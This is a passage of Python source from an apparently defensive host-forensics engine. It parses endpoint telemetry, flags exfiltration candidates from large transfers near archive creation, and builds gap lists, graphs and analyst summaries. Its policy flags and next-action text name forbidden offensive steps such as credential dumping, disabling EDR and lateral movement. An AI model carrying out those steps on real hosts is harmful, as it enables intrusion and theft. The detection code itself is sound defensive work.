            "Does persistence mechanism prove malicious persistence?",
            "Does security control offline prove tampering?",
            "What evidence would disprove the leading compromise hypothesis?",
        ]
    )

    return {
        "flags": sorted(set(flags)),
        "alternative_explanations": sorted(set(alternatives)),
        "diagnostic_questions": questions,
        "review_outcome": "PARTIAL_AGREEMENT" if flags else "AGREE",
        "privacy_boundary": "No credential use, no real-person attribution, no offensive endpoint action.",
    }


def build_knowledge_gaps(
    hosts: List[HostObject],
    processes: List[ProcessObject],
    files: List[FileObject],
    connections: List[ConnectionObject],
    controls: List[SecurityControlObject],
    baselines: List[BaselineObject],
    ioc_matches: List[IocMatch],
    persistence: List[PersistenceIndicator],
    contradictions: List[str],
    exfiltration_candidates: List[Dict[str, Any]],
) -> List[Dict[str, Any]]:
    gaps: List[Dict[str, Any]] = []

    def add_gap(description: str, importance: str, recommended_source: str, specialist: str, expected_information_value: str) -> None:
        gaps.append(
            {
                "gap_id": new_id("GAP"),
                "description": description,
                "importance": importance,
                "recommended_source": recommended_source,
                "specialist": specialist,
                "expected_information_value": expected_information_value,
            }
        )

    for h in hosts:
        if not h.device_id and not h.asset_id:
            add_gap(
                f"Host {h.host_id} lacks stable device/asset identifier.",
                "HIGH",
                "CMDB / MDM / EDR agent inventory",
                "HOSTINT / ASSETINT",
                "Reduces hostname reuse and host-era contamination risk.",
            )

    if not baselines:
        add_gap(
            "No host baseline supplied.",
            "HIGH",
            "gold image / peer inventory / configuration management",
            "HOSTINT / ORGINT",
            "Enables change/anomaly interpretation and reduces false positive risk.",
        )

    for p in processes:
        if not p.path and not p.image:
            add_gap(
                f"Process {p.process_id} identity incomplete.",
                "MEDIUM",
                "EDR process detail / forensic image / memory output",
                "HOSTINT / FORENSICINT",
                "Improves program identity and execution context.",
            )

    for f in files:
        if not f.sha256:
            add_gap(
                f"File {f.file_id} lacks hash.",
                "MEDIUM",
                "filesystem metadata / forensic image",
                "FORENSICINT / MALINT",
                "Enables reliable IOC correlation and integrity context.",
            )

    for c in connections:
        if not c.local_process_id:
            add_gap(
                f"Connection {c.connection_id} lacks process association.",
                "HIGH",
                "EDR socket telemetry / Sysmon / PCAP context",
                "HOSTINT / NETINT",
                "Determines which process generated network activity.",
            )

    for ctrl in controls:
        if ctrl.state == SecurityControlState.UNKNOWN:
            add_gap(
                f"Security control {ctrl.control_id} state unknown.",
                "MEDIUM",
                "MDM / EDR health / endpoint inventory",
                "HOSTINT / SECOPS",
                "Clarifies whether protective telemetry was available during event window.",
            )

    if any(m.freshness in (IOCFreshness.STALE, IOCFreshness.UNKNOWN) for m in ioc_matches):
        add_gap(
            "One or more IOC matches are stale or freshness-unresolved.",
            "HIGH",
            "threat feed provenance / IOC history",
            "CTI / IOCINT",
            "Prevents stale indicator from driving false compromise conclusion.",
        )

    if any(p.state == PersistenceState.PERSISTENCE_CANDIDATE for p in persistence):
        add_gap(
            "Persistence candidate requires publisher/path/timeline/behavior corroboration.",
            "HIGH",
            "software inventory / code signing / EDR process tree",
            "HOSTINT / MALINT / CTI",
            "Distinguishes legitimate startup from suspicious persistence.",
        )

    if contradictions:
        add_gap(
            "Evidence contradictions require source/time/host-era reconciliation.",
            "HIGH",
            "raw telemetry / acquisition logs / host rebuild history",
            "HOSTINT / FORENSICINT / LOGINT",
            "Prevents false correlation from clock skew, duplicates, or host-era contamination.",
        )

    if exfiltration_candidates:
        add_gap(
            "Exfiltration candidate lacks file-transfer/network-payload confirmation.",
            "HIGH",
            "PCAP / NetFlow / proxy logs / cloud storage logs / DLP",
            "NETINT / CLOUDINT / INCIDENTINT",
            "Determines whether data was actually transmitted.",
        )

    add_gap(
        "Real-person operator attribution is unresolved.",
        "HIGH",
        "authorized identity/access evidence / HR/IAM review / human review",
        "HOSTINT / IAM / LEGAL_REVIEW",
        "Prevents unsupported person attribution from technical artifacts.",
    )

    return gaps


def build_graphical_memory(
    hosts: List[HostObject],
    processes: List[ProcessObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    files: List[FileObject],
    controls: List[SecurityControlObject],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    alerts: List[AlertObject],
    ioc_matches: List[IocMatch],
    changes: List[ChangeObject],
    anomalies: List[AnomalyObject],
    persistence: List[PersistenceIndicator],
    ttps: List[TtpMapping],
    facts: List[FactRecord],
    hypotheses: List[Hypothesis],
    contradictions: List[str],
    gaps: List[Dict[str, Any]],
) -> Dict[str, Any]:
    nodes: Dict[str, GraphNode] = {}
    edges: List[GraphEdge] = []

    def add_node(node_id: str, node_type: str, attributes: Dict[str, Any]) -> None:
        nodes[node_id] = GraphNode(node_id=node_id, type=node_type, attributes=attributes)

    def add_edge(source: str, target: str, relation: str, confidence: float, evidence_ids: List[str]) -> None:
        edges.append(
            GraphEdge(
                edge_id=new_id("EDGE"),
                source_node_id=source,
                target_node_id=target,
                relation=relation,
                confidence=confidence,
                evidence_ids=sorted(set(evidence_ids)),
            )
        )

    for h in hosts:
        add_node(
            f"N_HOST_{h.host_id}",
            "Host",
            {
                "hostname": h.hostname,
                "asset_id": h.asset_id,
                "device_id": h.device_id,
                "os_family": h.os_family,
                "os_version": h.os_version,
                "status": h.status.name,
                "confidence": h.confidence,
            },
        )

        for era in h.host_eras:
            era_node = f"N_HOST_ERA_{era.era_id}"
            add_node(
                era_node,
                "HostEra",
                {
                    "state": era.state.name,
                    "valid_from": era.valid_from,
                    "valid_to": era.valid_to,
                    "trigger": era.trigger,
                },
            )
            add_edge(era_node, f"N_HOST_{h.host_id}", "BELONGS_TO_HOST", h.confidence, era.evidence_ids)

    for p in processes:
        proc_node = f"N_PROCESS_{p.process_id}"
        add_node(
            proc_node,
            "Process",
            {
                "image": p.image,
                "path": p.path,
                "pid": p.pid,
                "ppid": p.ppid,
                "user_context": p.user_context,
                "start_time": p.start_time,
                "sha256": p.sha256,
                "confidence": p.confidence,
            },
        )

        if p.host_id:
            add_edge(proc_node, f"N_HOST_{p.host_id}", "RUNNING_ON", p.confidence, p.evidence_ids)

        if p.parent_process_id:
            add_edge(f"N_PROCESS_{p.parent_process_id}", proc_node, "SPAWNED", p.confidence, p.evidence_ids)

    for s in services:
        svc_node = f"N_SERVICE_{s.service_id}"
        add_node(
            svc_node,
            "Service",
            {
                "name": s.name,
                "binary_path": s.binary_path,
                "start_type": s.start_type,
                "account": s.account,
                "state": s.state,
                "publisher": s.publisher,
            },
        )
        if s.host_id:
            add_edge(svc_node, f"N_HOST_{s.host_id}", "BELONGS_TO_HOST", s.confidence, s.evidence_ids)

    for t in tasks:
        task_node = f"N_TASK_{t.task_id}"
        add_node(
            task_node,
            "ScheduledTask",
            {
                "name": t.name,
                "schedule": t.schedule,
                "action": t.action,
                "principal": t.principal,
                "state": t.state,
            },
        )
        if t.host_id:
            add_edge(task_node, f"N_HOST_{t.host_id}", "BELONGS_TO_HOST", t.confidence, t.evidence_ids)

    for f in files:
        file_node = f"N_FILE_{f.file_id}"
        add_node(
            file_node,
            "File",
            {
                "path": f.path,
                "sha256": f.sha256,
                "publisher": f.publisher,
                "signature_valid": f.signature_valid,
                "created_at": f.created_at,
                "modified_at": f.modified_at,
            },
        )
        if f.host_id:
            add_edge(file_node, f"N_HOST_{f.host_id}", "BELONGS_TO_HOST", f.confidence, f.evidence_ids)

    for c in controls:
        ctrl_node = f"N_CONTROL_{c.control_id}"
        add_node(
            ctrl_node,
            "SecurityControl",
            {
                "control_type": c.control_type,
                "product": c.product,
                "state": c.state.name,
                "healthy": c.healthy,
            },
        )
        if c.host_id:
            add_edge(f"N_HOST_{c.host_id}", ctrl_node, "PROTECTED_BY", c.confidence, c.evidence_ids)

    for conn in connections:
        conn_node = f"N_CONNECTION_{conn.connection_id}"
        add_node(
            conn_node,
            "Connection",
            {
                "remote_ip": conn.remote_ip,
                "remote_domain": conn.remote_domain,
                "remote_port": conn.remote_port,
                "protocol": conn.protocol,
                "bytes_sent": conn.bytes_sent,
                "start_time": conn.start_time,
            },
        )
        if conn.host_id:
            add_edge(conn_node, f"N_HOST_{conn.host_id}", "BELONGS_TO_HOST", conn.confidence, conn.evidence_ids)
        if conn.local_process_id:
            add_edge(f"N_PROCESS_{conn.local_process_id}", conn_node, "CONNECTED_TO", conn.confidence, conn.evidence_ids)

    for d in dns:
        dns_node = f"N_DNS_{d.dns_id}"
        add_node(
            dns_node,
            "DNSArtifact",
            {
                "queried_domain": d.queried_domain,
                "resolved_ips": d.resolved_ips,
                "timestamp": d.timestamp,
            },
        )
        if d.host_id:
            add_edge(dns_node, f"N_HOST_{d.host_id}", "BELONGS_TO_HOST", d.confidence, d.evidence_ids)
        if d.process_id:
            add_edge(f"N_PROCESS_{d.process_id}", dns_node, "RESOLVED_DOMAIN", d.confidence, d.evidence_ids)

    for a in alerts:
        alert_node = f"N_ALERT_{a.alert_id}"
        add_node(
            alert_node,
            "Alert",
            {
                "alert_name": a.alert_name,
                "rule": a.rule,
                "severity": a.severity,
                "detection_time": a.detection_time,
                "upstream_event_id": a.upstream_event_id,
            },
        )
        if a.host_id:
            add_edge(alert_node, f"N_HOST_{a.host_id}", "OBSERVED_BY", a.confidence, a.evidence_ids)
        if a.process_id:
            add_edge(alert_node, f"N_PROCESS_{a.process_id}", "AFFECTED_BY", a.confidence, a.evidence_ids)
        if a.file_id:
            add_edge(alert_node, f"N_FILE_{a.file_id}", "AFFECTED_BY", a.confidence, a.evidence_ids)

    for m in ioc_matches:
        ioc_node = f"N_IOC_{m.ioc_id}"
        if ioc_node not in nodes:
            add_node(ioc_node, "IOC", {"value": m.value, "freshness": m.freshness.name})

        obj_prefix = {
            "process": "N_PROCESS_",
            "file": "N_FILE_",
            "service": "N_SERVICE_",
            "scheduled_task": "N_TASK_",
            "connection": "N_CONNECTION_",
            "dns_artifact": "N_DNS_",
            "registry_artifact": "N_REGISTRY_",
        }.get(m.object_type, "N_OBJECT_")

        obj_node = f"{obj_prefix}{m.object_id}"
        if obj_node not in nodes:
            add_node(obj_node, m.object_type.capitalize(), {"object_id": m.object_id})

        add_edge(obj_node, ioc_node, "MATCHES_IOC", m.confidence, m.evidence_ids)

    for ch in changes:
        ch_node = f"N_CHANGE_{ch.change_id}"
        add_node(
            ch_node,
            "Change",
            {
                "change_type": ch.change_type,
                "object_id": ch.object_id,
                "new_value": ch.new_value,
                "detected_at": ch.detected_at,
            },
        )
        if ch.host_id:
            add_edge(ch_node, f"N_HOST_{ch.host_id}", "BELONGS_TO_HOST", ch.confidence, ch.evidence_ids)

    for an in anomalies:
        an_node = f"N_ANOMALY_{an.anomaly_id}"
        add_node(
            an_node,
            "Anomaly",
            {
                "artifact": an.artifact,
                "severity": an.severity.name,
                "difference": an.difference,
            },
        )
        if an.host_id:
            add_edge(an_node, f"N_HOST_{an.host_id}", "BELONGS_TO_HOST", an.confidence, an.evidence_ids)

    for pers in persistence:
        pers_node = f"N_PERSISTENCE_{pers.indicator_id}"
        add_node(
            pers_node,
            "PersistenceIndicator",
            {
                "mechanism": pers.mechanism,
                "state": pers.state.name,
                "reason": pers.reason,
            },
        )
        if pers.object_id:
            prefix = {
                "SERVICE": "N_SERVICE_",
                "SCHEDULED_TASK": "N_TASK_",
                "REGISTRY_OR_CONFIG_AUTORUN": "N_REGISTRY_",
                "STARTUP_ARTIFACT": "N_STARTUP_",
            }.get(pers.mechanism, "N_OBJECT_")
            add_edge(pers_node, f"{prefix}{pers.object_id}", "PERSISTED_VIA", pers.confidence, pers.evidence_ids)

    for t in ttps:
        ttp_node = f"N_TTP_{t.mapping_id}"
        add_node(
            ttp_node,
            "ATTACKTechnique",
            {
                "technique_id": t.technique_id,
                "technique_name": t.technique_name,
                "behavior": t.behavior,
                "state": t.state.name,
            },
        )
        for eid in t.evidence_ids:
            # Link to process/service/task/connection nodes where possible by evidence is approximate.
            pass

    for f in facts:
        fact_node = f"N_FACT_{f.fact_id}"
        add_node(
            fact_node,
            "Fact",
            {
                "statement": f.statement,
                "claim_type": f.claim_type,
                "verification_state": f.verification_state.name,
                "confidence": f.confidence,
            },
        )

    for h in hypotheses:
        hyp_node = f"N_HYPOTHESIS_{h.id}"
        add_node(
            hyp_node,
            "Hypothesis",
            {
                "description": h.description,
                "status": h.status.name,
                "support_evidence": h.support_evidence,
                "opposition_evidence": h.opposition_evidence,
            },
        )

    for c in contradictions:
        cid = hashlib.sha256(c.encode()).hexdigest()[:10]
        add_node(f"N_CONTRADICTION_{cid}", "Contradiction", {"text": c})

    for g in gaps:
        add_node(f"N_GAP_{g['gap_id']}", "Gap", g)

    return {
        "nodes": [asdict(n) for n in nodes.values()],
        "edges": [asdict(e) for e in edges],
    }


def generate_analyst_summary(
    hosts: List[HostObject],
    processes: List[ProcessObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    files: List[FileObject],
    controls: List[SecurityControlObject],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    alerts: List[AlertObject],
    ioc_matches: List[IocMatch],
    changes: List[ChangeObject],
    anomalies: List[AnomalyObject],
    persistence: List[PersistenceIndicator],
    ttps: List[TtpMapping],
    compromise_state: CompromiseState,
    contradictions: List[str],
    gaps: List[Dict[str, Any]],
) -> str:
    lines: List[str] = []

    lines.append("=== HOSTINT REQUIRED ANALYST SUMMARY ===")

    lines.append("HOST IDENTITY:")
    for h in hosts:
        lines.append(
            f"- {h.host_id}: hostname={h.hostname}, asset_id={h.asset_id}, device_id={h.device_id}, status={h.status.name}, confidence={h.confidence}"
        )

    lines.append("")
    lines.append("HOST ERA:")
    for h in hosts:
        for era in h.host_eras:
            lines.append(f"- {h.host_id}: {era.era_id} state={era.state.name} from={era.valid_from} to={era.valid_to} trigger={era.trigger}")

    lines.append("")
    lines.append("OS / BUILD:")
    for h in hosts:
        lines.append(f"- {h.host_id}: {h.os_family} {h.os_version} build={h.os_build} kernel={h.kernel_version}")

    lines.append("")
    lines.append("HARDWARE / FIRMWARE:")
    for h in hosts:
        lines.append(f"- {h.host_id}: hardware={h.hardware_model}, firmware={h.firmware_version}")

    lines.append("")
    lines.append("BOOT CONTEXT:")
    lines.append("- Boot context is represented through host era/process/service timing where supplied.")

    lines.append("")
    lines.append("USERS / SESSIONS:")
    users = sorted({p.user_context for p in processes if p.user_context})
    lines.append(f"- Observed account contexts: {', '.join(users) if users else 'none'}")
    lines.append("- Account context does not identify a real person.")

    lines.append("")
    lines.append("PRIVILEGED ACCOUNTS:")
    priv = sorted({p.privilege_context for p in processes if p.privilege_context})
    lines.append(f"- Privilege context observed: {', '.join(priv) if priv else 'not supplied'}")

    lines.append("")
    lines.append("PROCESSES:")
    for p in processes[:20]:
        lines.append(f"- {p.image or p.path}: pid={p.pid}, ppid={p.ppid}, start={p.start_time}, user={p.user_context}")

    lines.append("")
    lines.append("PROCESS TREE:")
    for p in processes:
        if p.parent_process_id:
            lines.append(f"- {p.parent_process_id} -> {p.process_id} ({p.image or p.path})")

    lines.append("")
    lines.append("SERVICES:")
    for s in services[:20]:
        lines.append(f"- {s.name}: path={s.binary_path}, start_type={s.start_type}, publisher={s.publisher}")

    lines.append("")
    lines.append("SCHEDULED TASKS:")
    for t in tasks[:20]:
        lines.append(f"- {t.name}: action={t.action}, principal={t.principal}, state={t.state}")

    lines.append("")
    lines.append("DRIVERS / MODULES:")
    lines.append("- Driver/module details are included in generic artifact collections when supplied.")

    lines.append("")
    lines.append("FILES / HASHES:")
    for f in files[:20]:
        lines.append(f"- {f.path}: sha256={f.sha256}, publisher={f.publisher}, signature_valid={f.signature_valid}")

    lines.append("")
    lines.append("REGISTRY / CONFIGURATION:")
    lines.append("- Registry/configuration artifacts are included in generic artifact collections when supplied.")

    lines.append("")
    lines.append("INSTALLED SOFTWARE:")
    lines.append("- Software/package inventory is included in generic artifact collections when supplied.")

    lines.append("")
    lines.append("PATCH STATE:")
    lines.append("- Patch state is included in generic artifact collections when supplied.")

    lines.append("")
    lines.append("SECURITY CONTROLS:")
    for c in controls:
        lines.append(f"- {c.control_type} ({c.product}): state={c.state.name}, healthy={c.healthy}")

    lines.append("")
    lines.append("EDR / AV / FIREWALL STATE:")
    for c in controls:
        if c.control_type in {"EDR", "AV", "FIREWALL", "HOST_IDS", "MDM"}:
            lines.append(f"- {c.control_type}: {c.state.name}")

    lines.append("")
    lines.append("NETWORK CONNECTIONS:")
    for c in connections[:20]:
        lines.append(f"- {c.remote_domain or c.remote_ip}:{c.remote_port} proto={c.protocol} bytes_sent={c.bytes_sent} process={c.local_process_id}")

    lines.append("")
    lines.append("DNS CONTEXT:")
    for d in dns[:20]:
        lines.append(f"- {d.queried_domain} -> {d.resolved_ips} at {d.timestamp}")

    lines.append("")
    lines.append("USB / STORAGE:")
    lines.append("- USB/storage context is included in generic artifact collections when supplied.")

    lines.append("")
    lines.append("CONTAINER / VM CONTEXT:")
    lines.append("- Container/VM context is included in generic artifact collections when supplied.")

    lines.append("")
    lines.append("PERSISTENCE CANDIDATES:")
    for p in persistence:
        lines.append(f"- {p.mechanism}: {p.state.name} | {p.reason}")

    lines.append("")
    lines.append("BASELINE DIFFERENCES:")
    for a in anomalies[:20]:
        lines.append(f"- {a.artifact}: {a.severity.name} | {a.difference}")

    lines.append("")
    lines.append("IOC MATCHES:")
    for m in ioc_matches[:30]:
        lines.append(
            f"- {m.relation_type}: {m.object_type} {m.object_id} | value={m.value} | freshness={m.freshness.name} | observed={m.observed}"
        )

    lines.append("")
    lines.append("TTP MAPPINGS:")
    for t in ttps:
        lines.append(f"- {t.technique_id} {t.technique_name}: {t.state.name} | behavior={t.behavior}")

    lines.append("")
    lines.append("HOST TIMELINE:")
    timeline_rows: List[Tuple[str, str]] = []

    for p in processes:
        if p.start_time:
            timeline_rows.append((p.start_time.isoformat(), f"PROCESS_START {p.image or p.path} pid={p.pid}"))

    for f in files:
        if f.created_at:
            timeline_rows.append((f.created_at.isoformat(), f"FILE_CREATED {f.path}"))

    for s in services:
        if s.created_at:
            timeline_rows.append((s.created_at.isoformat(), f"SERVICE_CREATED {s.name}"))

    for t in tasks:
        if t.created_at:
            timeline_rows.append((t.created_at.isoformat(), f"TASK_CREATED {t.name}"))

    for c in connections:
        if c.start_time:
            timeline_rows.append((c.start_time.isoformat(), f"CONNECTION {c.remote_domain or c.remote_ip}:{c.remote_port}"))

    for d in dns:
        if d.timestamp:
            timeline_rows.append((d.timestamp.isoformat(), f"DNS {d.queried_domain}"))

    for a in alerts:
        if a.detection_time:
            timeline_rows.append((a.detection_time.isoformat(), f"ALERT {a.alert_name}"))

    for ts, desc in sorted(timeline_rows)[:40]:
        lines.append(f"- {ts}: {desc}")

    lines.append("")
    lines.append("INCIDENT CORRELATION:")
    lines.append("- Incident correlation requires INCIDENTINT/CTI context beyond single-host artifacts.")

    lines.append("")
    lines.append("COMPROMISE STATUS:")
    lines.append(f"- {compromise_state.name}")
    lines.append("- Compromise status does not automatically establish actor attribution.")

    lines.append("")
    lines.append("SOURCE RELIABILITY:")
    lines.append("- Source reliability is recorded per evidence item and result source_reliability section.")

    lines.append("")
    lines.append("SOURCE INDEPENDENCE:")
    lines.append("- Source independence is recorded in result source_independence section.")

    lines.append("")
    lines.append("CONTRADICTIONS:")
    if contradictions:
        for c in contradictions:
            lines.append(f"- {c}")
    else:
        lines.append("- None detected from supplied evidence.")

    lines.append("")
    lines.append("UNKNOWN:")
    lines.append("- Real-person operator identity.")
    lines.append("- Intent.")
    lines.append("- Maliciousness.")
    lines.append("- Full incident scope.")
    lines.append("- Threat actor / campaign attribution.")

    lines.append("")
    lines.append("NEXT ACTION:")
    lines.append("- Preserve forensic image/memory/logs through authorized IR workflow.")
    lines.append("- Retrieve detailed EDR process tree and file hash.")
    lines.append("- Hand suspicious binary to MALINT; do not execute.")
    lines.append("- Correlate domain/IP with NETINT/CTI and check IOC freshness.")
    lines.append("- Review account/session and authorized change/test records.")
    lines.append("- Compare against gold-image/peer baseline and host-era history.")
    lines.append("- Require human review before isolation, reimage, personnel action, or attribution.")

    return "\n".join(lines)


# ==============================================================================
# MAIN ENGINE: HOSTINT AI EMPLOYEE
# ==============================================================================

class HostIntEmployee:
    """
    Defensive HOSTINT employee.

    Consumes already-collected authorized endpoint telemetry/evidence representations.
    Does not access unauthorized hosts, exploit, deploy malware, install persistence,
    dump credentials, disable security controls, perform lateral movement,
    privilege escalation, defense evasion, or destructive remediation.
    """

    def __init__(self, model_mode: str = "LOCAL_ONLY"):
        self.model_mode = model_mode.upper()
        logger.info("HOSTINT employee initialized in mode=%s", self.model_mode)

    def process_case(
        self,
        case_id: str,
        task_id: str,
        objective: str,
        scope: Dict[str, Any],
        evidence_input: Dict[str, Any],
        known_facts: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        known_facts = known_facts or {}
        now = datetime.now(timezone.utc)

        try:
            enforce_policy(objective, scope)
        except PolicyViolation as exc:
            return {
                "case_id": case_id,
                "task_id": task_id,
                "objective": objective,
                "status": "POLICY_BLOCKED",
                "error": str(exc),
                "privacy_flags": [
                    "AUTHORIZED_ENDPOINT_ONLY",
                    "PASSIVE_FIRST_DEFAULT",
                    "NO_EXPLOITATION",
                    "NO_CREDENTIAL_DUMP",
                    "NO_PERSISTENCE_INSTALLATION",
                    "NO_EDR_DISABLE",
                    "NO_REAL_PERSON_AUTONOMOUS_ATTRIBUTION",
                ],
            }

        logger.info("Starting HOSTINT case=%s task=%s", case_id, task_id)

        evidences: List[EvidenceRef] = []

        hosts = [parse_host(h, case_id, now, evidences) for h in evidence_input.get("hosts", []) or []]
        default_host_id = hosts[0].host_id if hosts else None

        processes = [parse_process(p, case_id, default_host_id, now, evidences) for p in evidence_input.get("processes", []) or []]
        services = [parse_service(s, case_id, default_host_id, now, evidences) for s in evidence_input.get("services", []) or []]
        tasks = [parse_task(t, case_id, default_host_id, now, evidences) for t in evidence_input.get("scheduled_tasks", []) or []]
        files = [parse_file(f, case_id, default_host_id, now, evidences) for f in evidence_input.get("files", []) or []]
        controls = [parse_security_control(c, case_id, default_host_id, now, evidences) for c in evidence_input.get("security_controls", []) or []]
        connections = [parse_connection(c, case_id, default_host_id, now, evidences) for c in evidence_input.get("connections", []) or []]
        dns = [parse_dns(d, case_id, default_host_id, now, evidences) for d in evidence_input.get("dns_artifacts", []) or []]
        alerts = [parse_alert(a, case_id, default_host_id, now, evidences) for a in evidence_input.get("alerts", []) or []]
        iocs = [parse_ioc(i, case_id, now, evidences) for i in evidence_input.get("iocs", []) or []]
        baselines = [parse_baseline(b, case_id, default_host_id, now, evidences) for b in evidence_input.get("baselines", []) or []]

        generic_types = [
            "drivers",
            "modules",
            "registry_artifacts",
            "configurations",
            "installed_software",
            "software",
            "packages",
            "patches",
            "network_interfaces",
            "sockets",
            "mounts",
            "storage",
            "usb_devices",
            "containers",
            "virtual_machines",
            "startup_artifacts",
            "execution_history",
            "incident_context",
        ]

        generic: Dict[str, List[Dict[str, Any]]] = {}
        for typ in generic_types:
            generic[typ] = parse_generic_collection(
                evidence_input.get(typ, []) or [],
                typ,
                case_id,
                default_host_id,
                now,
                evidences,
            )

        incident_context = evidence_input.get("incident_context", {}) or {}
        if isinstance(incident_context, dict):
            incident_context = {**incident_context}
        else:
            incident_context = {"raw": incident_context}

        build_process_tree(processes)
        associate_connections_to_processes(processes, connections)

        ioc_matches = match_iocs(iocs, processes, files, services, tasks, connections, dns, generic, now)

        source_independence = analyze_source_independence(evidences)
        deduped_alerts, alert_duplicate_log = deduplicate_alerts(alerts)

        changes, anomalies = compare_baseline(
            baselines=baselines,
            processes=processes,
            services=services,
            tasks=tasks,
            files=files,
            connections=connections,
            dns=dns,
            controls=controls,
            generic=generic,
            ioc_matches=ioc_matches,
            incident_context=incident_context,
        )

        persistence = analyze_persistence(
            services=services,
            tasks=tasks,
            generic=generic,
            ioc_matches=ioc_matches,
            changes=changes,
            incident_context=incident_context,
        )

        ttps = map_ttps(
            processes=processes,
            services=services,
            tasks=tasks,
            generic=generic,
            connections=connections,
            dns=dns,
            controls=controls,
            alerts=deduped_alerts,
            ioc_matches=ioc_matches,
            persistence=persistence,
        )

        contradictions = detect_contradictions(
            hosts=hosts,
            processes=processes,
            files=files,
            services=services,
            tasks=tasks,
            connections=connections,
            controls=controls,
            alerts=deduped_alerts,
            iocs=iocs,
            generic=generic,
        )

        compromise_state, compromise_details = assess_compromise(
            hosts=hosts,
            processes=processes,
            files=files,
            services=services,
            tasks=tasks,
            connections=connections,
            dns=dns,
            controls=controls,
            alerts=deduped_alerts,
            ioc_matches=ioc_matches,
            changes=changes,
            anomalies=anomalies,
            persistence=persistence,
            contradictions=contradictions,
            evidences=evidences,
            known_facts=known_facts,
            incident_context=incident_context,
        )

        facts = build_facts(
            hosts=hosts,
            processes=processes,
            files=files,
            services=services,
            tasks=tasks,
            connections=connections,
            dns=dns,
            controls=controls,
            alerts=deduped_alerts,
            ioc_matches=ioc_matches,
            changes=changes,
            anomalies=anomalies,
            persistence=persistence,
            ttps=ttps,
            compromise_state=compromise_state,
            contradictions=contradictions,
        )

        hypotheses = build_hypotheses(
            compromise_state=compromise_state,
            processes=processes,
            files=files,
            services=services,
            tasks=tasks,
            connections=connections,
            controls=controls,
            ioc_matches=ioc_matches,
            persistence=persistence,
            anomalies=anomalies,
            known_facts=known_facts,
            incident_context=incident_context,
            contradictions=contradictions,
            hosts=hosts,
        )

        skeptic = independent_skeptic_review(
            compromise_state=compromise_state,
            ioc_matches=ioc_matches,
            alerts=deduped_alerts,
            processes=processes,
            files=files,
            connections=connections,
            persistence=persistence,
            controls=controls,
            contradictions=contradictions,
            known_facts=known_facts,
        )

        # Exfiltration candidates are intentionally conservative.
        exfiltration_candidates: List[Dict[str, Any]] = []
        large_transfers = [c for c in connections if isinstance(c.bytes_sent, int) and c.bytes_sent >= 10_000_000]
        archive_files = [f for f in files if str(f.path or "").lower().endswith((".zip", ".rar", ".7z", ".tar", ".gz", ".tgz", ".bz2", ".xz"))]

        for conn in large_transfers:
            nearby_archive = False
            if conn.start_time:
                for arc in archive_files:
                    if arc.created_at and abs((arc.created_at - conn.start_time).total_seconds()) <= 3600:
                        nearby_archive = True
                        break

            exfiltration_candidates.append(
                {
                    "candidate_id": new_id("EXFIL"),
                    "host_id": conn.host_id,
                    "connection_id": conn.connection_id,
                    "bytes_sent": conn.bytes_sent,
                    "remote_ip": conn.remote_ip,
                    "remote_domain": conn.remote_domain,
                    "nearby_archive_creation": nearby_archive,
                    "state": "EXFILTRATION_CANDIDATE",
                    "verification_state": VerificationState.INCONCLUSIVE.name,
                    "limitations": [
                        "Large transfer alone does not prove exfiltration.",
                        "Archive creation alone does not prove exfiltration.",
                        "Requires PCAP/NetFlow/proxy/cloud-storage/DLP corroboration.",
                    ],
                }
            )

        gaps = build_knowledge_gaps(
            hosts=hosts,
            processes=processes,
            files=files,
            connections=connections,
            controls=controls,
            baselines=baselines,
            ioc_matches=ioc_matches,
            persistence=persistence,
            contradictions=contradictions,
            exfiltration_candidates=exfiltration_candidates,
        )

        graph = build_graphical_memory(
            hosts=hosts,
            processes=processes,
            services=services,
            tasks=tasks,
            files=files,
            controls=controls,
            connections=connections,
            dns=dns,
            alerts=deduped_alerts,
            ioc_matches=ioc_matches,
            changes=changes,
            anomalies=anomalies,
            persistence=persistence,
            ttps=ttps,
            facts=facts,
            hypotheses=hypotheses,
            contradictions=contradictions,
            gaps=gaps,
        )

        analyst_summary = generate_analyst_summary(
            hosts=hosts,
            processes=processes,
            services=services,
            tasks=tasks,
            files=files,
            controls=controls,
            connections=connections,
            dns=dns,
            alerts=deduped_alerts,
            ioc_matches=ioc_matches,
            changes=changes,
            anomalies=anomalies,
            persistence=persistence,
            ttps=ttps,
            compromise_state=compromise_state,
            contradictions=contradictions,
            gaps=gaps,
        )

        recommended_next_actions = [
            {
                "action": "Preserve forensic disk image, memory capture, logs, EDR telemetry, and network state through authorized IR workflow.",
                "reason": "Evidence preservation precedes destructive remediation.",
                "specialist": "FORENSICINT / INCIDENTINT",
                "privacy": "AUTHORIZED_ONLY",
            },
            {
                "action": "Retrieve detailed EDR/Sysmon process tree and command context for suspicious processes.",
                "reason": "Process lineage strengthens execution and parent-child interpretation.",
                "specialist": "HOSTINT / LOGINT",
                "privacy": "AUTHORIZED_ONLY",
            },
            {
                "action": "Hand suspicious binaries/scripts to MALINT for safe static/dynamic analysis.",
                "reason": "HOSTINT does not execute unknown binaries or perform malware reverse engineering.",
                "specialist": "MALINT",
                "privacy": "AUTHORIZED_SANDBOX_ONLY",
            },
            {
                "action": "Correlate domains/IPs/URLs/hashes with CTI and check IOC freshness/provenance.",
                "reason": "IOC match alone does not establish campaign or actor.",
                "specialist": "CTI / THREATACTORINT / IOCINT",
                "privacy": "AUTHORIZED_ONLY",
            },
            {
                "action": "Review account/session, privileged-group, and authentication telemetry through authorized IAM/SOC workflow.",
                "reason": "Account activity does not identify a real person.",
                "specialist": "IDENTITYINT / IAM / SOC",
                "privacy": "AUTHORIZED_ONLY",
            },
            {
                "action": "Check authorized change tickets, maintenance windows, software update calendars, and security-test calendars.",
                "reason": "Benign administration, updates, and testing can mimic suspicious patterns.",
                "specialist": "ORGINT / CHANGE_MANAGEMENT / SECURITY_TEST_GOVERNANCE",
                "privacy": "AUTHORIZED_ONLY",
            },
            {
                "action": "Obtain PCAP/NetFlow/proxy/cloud-storage/DLP evidence before any exfiltration conclusion.",
                "reason": "Connection, DNS, archive creation, or large transfer alone do not prove exfiltration.",
                "specialist": "NETINT / CLOUDINT / INCIDENTINT",
                "privacy": "AUTHORIZED_ONLY",
            },
            {
                "action": "Do not disable EDR/AV/firewall, dump credentials, exploit, move laterally, or execute remediation autonomously.",
                "reason": "HOSTINT boundary is defensive intelligence; consequential actions require authorized human/IR workflow.",
